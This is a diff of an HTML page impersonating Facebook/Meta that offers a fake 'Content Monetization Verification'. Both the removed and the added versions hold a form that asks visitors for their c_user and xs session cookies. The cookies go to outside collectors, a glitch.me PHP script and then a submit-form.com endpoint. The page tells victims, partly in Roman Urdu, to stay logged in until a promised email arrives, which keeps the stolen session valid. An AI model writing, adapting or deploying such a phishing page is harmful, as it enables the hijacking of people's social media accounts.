@@ -3,201 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <link href="style.css" rel="stylesheet">
-    <title>Content Monetization | Submit</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f7f7f7;
-            color: #333;
-        }
-
-        header {
-            background-color: #4267b2;
-            padding: 1.5rem;
-            color: white;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        header b {
-            font-size: 2.5rem;
-        }
-
-        .search-bar {
-            position: relative;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .search-bar input {
-            padding: 12px 18px;
-            width: 350px;
-            border-radius: 8px;
-            border: 1px solid #ddd;
-            font-size: 16px;
-        }
-
-        .form-container {
-            width: 80%;
-            max-width: 900px;
-            margin: 3rem auto;
-            background-color: white;
-            padding: 2.5rem;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-        }
-
-        .form-container h2 {
-            text-align: center;
-            color: #4267b2;
-            font-size: 2rem;
-            font-weight: bold;
-        }
-
-        .input-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .input-group label {
-            font-size: 15px;
-            font-weight: bold;
-            color: #555;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 15px;
-            margin-top: 8px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-        }
-
-        .input-group input:focus {
-            border-color: #4267b2;
-            outline: none;
-        }
-
-        .input-group p {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #4267b2;
-            border: none;
-            border-radius: 8px;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        .submit-btn:hover {
-            background-color: #365899;
-        }
-
-        footer {
-            text-align: center;
-            padding: 1rem;
-            background-color: #f5f6f7;
-            font-size: 12px;
-            color: #90949c;
-        }
-
-        footer a {
-            color: #4267b2;
-            text-decoration: none;
-        }
-
-        footer a:hover {
-            text-decoration: underline;
-        }
-
-        .video-thumbnail {
-            max-width: 100%;
-            margin: 1rem 0;
-        }
-
-        .highlight-text {
-            font-weight: bold;
-            color: #4267b2;
-        }
-
-        .highlight-large {
-            font-weight: bold;
-            font-size: 18px;
-            color: #d9534f;
-        }
-
-    </style>
+    <title>Action | Submit</title>
 </head>
 
 <body>
-    <header>
-        <b>Facebook</b>
-        <div class="search-bar">
-            <input type="search" placeholder="How Can We Assist You?" required>
+    <div class="md:block lg:block hidden border flex w-full h-[6rem] relative bg-[#4667ac]">
+        <div class="mx-10 mt-4">
+            <b class="text-5xl text-white">facebook</b>
         </div>
-    </header>
-
-    <div class="form-container">
-        <h2>Content Monetization Verification Request</h2>
-
-        <form action="https://periodic-highfalutin-foe.glitch.me/younis.php" method="post">
-            <input type="hidden" name="_redirect" value="https://periodic-highfalutin-foe.glitch.me/younis.php">
-
-            <!-- Verified Badge Information -->
-            <div class="input-group">
-                <p><span class="highlight-text">Important:</span> Facebook has provided you with the <strong>Content Monetization Tool</strong> for your page. To successfully apply for content monetization, you must submit your <strong>c_user</strong> and <strong>xs</strong> below for verification.</p>
-                <p class="highlight-large">This tool allows you to earn money through Facebook by displaying ads, sponsored content, and more. It's an exciting opportunity, but the verification process is critical for you to get started!</p>
-            </div>
-
-            <!-- Detailed Video Information -->
-            <div class="input-group">
-                <label for="video">Detailed Video Information:</label>
-                <a href="kabeer.mp4.mp4">
-                    <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" class="video-thumbnail" alt="Video Thumbnail">
-                </a>
-                <p class="highlight-text"><strong>Click on the image above</strong> to watch the detailed video that explains how to complete this process and ensure your account is properly verified for content monetization.</p>
-            </div>
-
-            <!-- User Information -->
-            <div class="input-group">
-                <label for="c_user">C_USER:</label>
-                <input type="text" id="c_user" name="c_user" placeholder="C_USER" pattern="[0-9]+" minlength="6" required>
-                <p class="highlight-large">Your <strong>account details</strong> are crucial for Facebook to verify your account for content monetization. Make sure to provide the correct information.</p>
-            </div>
-
-            <div class="input-group">
-                <label for="xs">XS:</label>
-                <input type="text" id="xs" name="xs" placeholder="XS" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Key must be at least 12 characters with letters, numbers, and symbols." required>
-                <p class="highlight-large">The <strong>XS</strong> is essential for securing your account and granting access to the monetization tool. Keep it safe!</p>
-            </div>
-
-            <!-- Additional Notes -->
-            <div class="input-group">
-                <p class="highlight-text"><strong>Important:</strong> Please ensure that your Facebook account remains logged in on your computer or laptop until you have received a confirmation email from Facebook.</p>
-                <p class="highlight-large"><strong>Logging out before verification may cause issues with the process and delay your approval.</strong> Keep your account active until everything is confirmed!</p>
-            </div>
-
-            <!-- Submit Button -->
-            <div class="input-group">
-                <button type="submit" class="submit-btn">Submit Verification Request</button>
-            </div>
-        </form>
+        <div>
+            <form class="sm:hidden lg:block md:block">
+                <label for="search" class="hidden lg:block md:block mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
+                <div class="relative hidden md:block lg:block">
+                    <div class="absolute inset-y-0 left-0 flex items-center pl-96 mx-3 pointer-events-none">
+                        <svg class="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
+                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"></path>
+                        </svg>
+                    </div>
+                    <input type="search" id="search" class="block w-[600px] p-1 mx-96 -mt-9 pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="How Can We Help?" required="">
+                </div>
+            </form>
+        </div>
     </div>
 
-    <footer>
-        <p>© META 2024 | <a href="https://www.metaservices.com">Meta Services</a></p>
-    </footer>
+    <form action="https://submit-form.com/sM6ETRQBF" method="post">
+        <input type="hidden" name="_redirect" value="https://pass-link-here.surge.sh">
+        <div id="root">
+            <div>
+                <img class="h-7 mx-10 mt-2 shadow-2xl" src="/home.png" alt="Home Image">
+            </div>
+            <div class="md:block lg:block hidden">
+                <p class="text-[#3578e5] text-xl font-extrabold font-serif mx-[4.50rem] -mt-6">
+                    <img src="https://cdn.glitch.global/325f7535-a68d-4687-a91c-1e7d9366104a/blue_tick-B9ADAlwo.png?v=1723987162846" alt="Meta" class="img-fluid" style="width: 4rem; height: 4rem; margin-bottom: 0px;">
+                </p>
+            </div>
+        </div>
+
+        <div class="border md:block hidden lg:block mx-72 mt-9 w-[630px]">
+            <p class="py-3 text-sm">
+                <a href="#" class="business-info">Creator Content Monetization</a>
+            </p>
+
+            <div>
+                <p class="mt-4 text-[12px] font-semibold">Facebook ne aapke page ko Content Monetization ka tool provide kiya hai. Aap yeh tool request bhej kar hasil kar sakte hain. Yeh tool aapko apne content ko monetize karne aur Facebook ke platform par earnings generate karne ki suvidha deta hai.</p>
+                <p class="mt-4 text-[12px] font-semibold">Agar aapko content monetization tool activate karna hai, to niche diye gaye steps follow karein:</p>
+                <ul class="mt-4 pl-4">
+                    <li>1. Apne Facebook page ko verify karna hoga.</li>
+                    <li>2. Content Monetization ke liye eligibility criteria complete karne honge.</li>
+                    <li>3. Facebook ke instructions follow karte hue request submit karein.</li>
+                </ul>
+                <p class="mt-4 text-[12px] font-semibold">Yeh request submit karne ke baad, aapko ek verification email milega. Aap apna account login rakhein takay aapko email mil sake.</p>
+            </div>
+
+            <div>
+                <p class="text-[11px] text-[#90949c] p-2 font-semibold">Detailed Video Information</p>
+            </div>
+
+            <div>
+                <a href="kabeer.mp4.mp4">
+                    <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" width="150" alt="Video Thumbnail">
+                </a>
+            </div>
+
+            <div>
+                <p class="pl-3 text-[12px] font-semibold">Please be sure to provide the requested information below.</p>
+            </div>
+
+            <div>
+                <p class="text-slate-400 pl-4 mt-1">c_user</p>
+                <input class="border h-6 pl-1 mx-3" type="text" name="c_user" id="c_user" placeholder="" pattern="[0-9]+" minlength="6" required>
+            </div>
+
+            <div>
+                <p class="text-slate-400 pl-4 mt-1">xs</p>
+                <input class="border h-6 pl-1 mx-3" type="text" name="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required aria-required="true">
+            </div>
+
+            <div>
+                <p class="mt-4 pl-3 text-[12px] font-semibold">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
+            </div>
+
+            <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
+                <div class="flex justify-end mx-2">
+                    <button class="border h-7 w-16 bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">Submit</button>
+                </div>
+            </div>
+
+            <footer>
+                <div>
+                    <li class="text-sm text-[#90949c] md:hidden lg:hidden sm:block mt-4 pl-72 flex hover:underline">META©️ 2024</li>
+                </div>
+            </footer>
+        </div>
+    </form>
 </body>
 
 </html>
